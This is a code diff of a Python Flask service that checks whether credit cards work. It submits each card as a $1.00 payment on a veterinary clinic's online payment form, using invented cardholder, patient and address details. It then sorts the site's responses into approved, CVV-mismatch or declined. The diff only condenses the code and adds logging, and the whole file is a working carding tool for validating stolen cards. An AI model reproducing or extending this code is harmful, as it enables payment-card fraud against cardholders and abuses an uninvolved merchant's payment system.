@@ -5,6 +5,11 @@ import requests
 from bs4 import BeautifulSoup
 import json
 from flask import Flask, request, jsonify
+import logging
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # --- Payment Config ---
 DOMAIN = "https://northstarvets.com"
@@ -22,54 +27,31 @@ approved_patterns = [
 
 # CCN patterns for Auth.net
 CCN_patterns = [
-    'CVV',
-    'Card Code',
-    'Security Code',
-    'CVV2',
-    'CVC',
-    'cvv does not match',
-    'security code'
+    'CVV', 'Card Code', 'Security Code', 'CVV2', 'CVC', 'cvv does not match', 'security code'
 ]
 
 # Declined patterns
 declined_patterns = [
-    'FAILED',
-    'declined',
-    'Declined',
-    'Transaction Declined',
-    'Card Declined',
-    'Insufficient Funds',
-    'Invalid Card',
-    'Expired Card',
-    'This transaction has been declined'
+    'FAILED', 'declined', 'Declined', 'Transaction Declined', 'Card Declined',
+    'Insufficient Funds', 'Invalid Card', 'Expired Card', 'This transaction has been declined'
 ]
 
 def generate_cardholder_name():
-    """Generate random cardholder name"""
     first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Lisa', 'Robert', 'Emily', 'James', 'Ashley']
     last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
     return f"{random.choice(first_names)} {random.choice(last_names)}"
 
 def get_card_type(cc):
-    """Determine card type from card number"""
-    if cc.startswith('4'):
-        return 'V'  # Visa
-    elif cc.startswith(('5', '2')):
-        return 'M'  # Mastercard
-    elif cc.startswith('3'):
-        return 'A'  # Amex
-    else:
-        return 'V'  # Default to Visa
+    if cc.startswith('4'): return 'V'  # Visa
+    elif cc.startswith(('5', '2')): return 'M'  # Mastercard
+    elif cc.startswith('3'): return 'A'  # Amex
+    else: return 'V'  # Default to Visa
 
 def convert_year(year):
-    """Convert YY to YYYY format"""
     if len(year) == 2:
         year_int = int(year)
         current_century = 2000
-        if year_int < 50:
-            return str(current_century + year_int)
-        else:
-            return str(1900 + year_int)
+        return str(current_century + year_int) if year_int < 50 else str(1900 + year_int)
     return year
 
 def ppc(card):
@@ -77,63 +59,34 @@ def ppc(card):
         parts = card.split("|")
         if len(parts) != 4:
             return json.dumps({"error": "Invalid card format"})
-            
         cc, mon, year, cvv = parts
         year = convert_year(year)
-        
         if not re.match(r'^\d{13,19}$', cc):
             return json.dumps({"error": "Invalid card number"})
-        
         ccname = generate_cardholder_name()
         cctype = get_card_type(cc)
-        
         data = {
-            'type_of_payment': 'Other',
-            'other_desc': 'New',
-            'office_location': 'Robbinsville',
-            'invoice_num': str(random.randint(1000000, 9999999)),
-            'amount': '1.00',
-            'email': 'xcracker08@gmail.com',
-            'phone_num': '7626527627',
-            'patient_id': str(random.randint(10000000, 99999999)),
-            'patient_name': ccname,
-            'fname': ccname.split()[0],
-            'lname': ccname.split()[1],
-            'address': '123 Main St',
-            'city': 'New York',
-            'state': 'NY',
-            'zip': '10001',
-            'cctype': cctype,
-            'ccn': cc,
-            'ccname': ccname,
-            'exp1': mon.zfill(2),
-            'exp2': year,
-            'cvv': cvv,
-            'process': 'yes',
+            'type_of_payment': 'Other', 'other_desc': 'New', 'office_location': 'Robbinsville',
+            'invoice_num': str(random.randint(1000000, 9999999)), 'amount': '1.00',
+            'email': 'xcracker08@gmail.com', 'phone_num': '7626527627',
+            'patient_id': str(random.randint(10000000, 99999999)), 'patient_name': ccname,
+            'fname': ccname.split()[0], 'lname': ccname.split()[1], 'address': '123 Main St',
+            'city': 'New York', 'state': 'NY', 'zip': '10001', 'cctype': cctype, 'ccn': cc,
+            'ccname': ccname, 'exp1': mon.zfill(2), 'exp2': year, 'cvv': cvv, 'process': 'yes',
         }
-        
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Language': 'en-GB,en;q=0.9',
-            'Origin': DOMAIN,
+            'Accept-Language': 'en-GB,en;q=0.9', 'Origin': DOMAIN,
             'Referer': f'{DOMAIN}/payment/index.php',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded'
         }
-        
-        response = requests.post(
-            f'{DOMAIN}/payment/index.php',
-            headers=headers,
-            data=data,
-            timeout=30
-        )
-        
+        response = requests.post(f'{DOMAIN}/payment/index.php', headers=headers, data=data, timeout=30)
         if response.status_code != 200:
             return json.dumps({"error": f"HTTP {response.status_code}"})
-            
         return response.text
-        
     except Exception as e:
+        logger.error(f"Error in ppc: {str(e)}")
         return json.dumps({"error": f"Processing error: {str(e)}"})
 
 def parse_result(result):
@@ -144,59 +97,41 @@ def parse_result(result):
                 return "ERROR", data["error"]
         except json.JSONDecodeError:
             pass
-        
         soup = BeautifulSoup(result, 'html.parser')
         full_text = soup.get_text()
-        
         if "FAILED" in full_text and "Error Message" in full_text:
             error_match = re.search(r'Error Message\s*:\s*([^.]+)', full_text)
-            if error_match:
-                return "DECLINED", error_match.group(1).strip()
-            return "DECLINED", "This transaction has been declined"
-        
+            return "DECLINED", error_match.group(1).strip() if error_match else "This transaction has been declined"
         message_text = ""
         error_div = soup.find('div', class_='message error')
-        if error_div:
-            message_text = error_div.get_text(strip=True)
+        if error_div: message_text = error_div.get_text(strip=True)
         success_div = soup.find('div', class_='message success')
-        if success_div:
-            message_text = success_div.get_text(strip=True)
-        
+        if success_div: message_text = success_div.get_text(strip=True)
         if not message_text:
             for selector in ['.alert', '.notification', '.response', '.result']:
                 element = soup.select_one(selector)
-                if element:
-                    message_text = element.get_text(strip=True)
-                    break
-        
+                if element: message_text = element.get_text(strip=True); break
         if not message_text:
             cleaned_text = re.sub(r'\s+', ' ', full_text).strip()
-            if "FAILED" in cleaned_text:
-                return "DECLINED", "Payment Failed"
+            if "FAILED" in cleaned_text: return "DECLINED", "Payment Failed"
             elif any(pattern.lower() in cleaned_text.lower() for pattern in declined_patterns):
                 for pattern in declined_patterns:
-                    if pattern.lower() in cleaned_text.lower():
-                        return "DECLINED", pattern
+                    if pattern.lower() in cleaned_text.lower(): return "DECLINED", pattern
             message_text = cleaned_text[:100] + "..." if len(cleaned_text) > 100 else cleaned_text
-        
         for pattern in approved_patterns:
-            if pattern.lower() in message_text.lower():
-                return "APPROVED", message_text
+            if pattern.lower() in message_text.lower(): return "APPROVED", message_text
         for pattern in CCN_patterns:
-            if pattern.lower() in message_text.lower():
-                return "CCN", message_text
+            if pattern.lower() in message_text.lower(): return "CCN", message_text
         for pattern in declined_patterns:
-            if pattern.lower() in message_text.lower():
-                return "DECLINED", message_text
-        
+            if pattern.lower() in message_text.lower(): return "DECLINED", message_text
         if any(word in message_text.lower() for word in ['success', 'approved', 'complete', 'thank']):
             return "APPROVED", message_text
         elif any(word in message_text.lower() for word in ['cvv', 'cvc', 'security', 'code']):
             return "CCN", message_text
         else:
             return "DECLINED", message_text
-            
     except Exception as e:
+        logger.error(f"Error in parse_result: {str(e)}")
         return "ERROR", f"Parse error: {str(e)}"
 
 def main(card):
@@ -210,8 +145,12 @@ def check_card():
     cc = request.args.get('cc')
     if not cc:
         return jsonify({"error": "Missing cc parameter"})
-    status, message = main(cc)
-    return jsonify({"status": status, "message": message})
+    try:
+        status, message = main(cc)
+        return jsonify({"status": status, "message": message})
+    except Exception as e:
+        logger.error(f"Error in check_card: {str(e)}")
+        return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
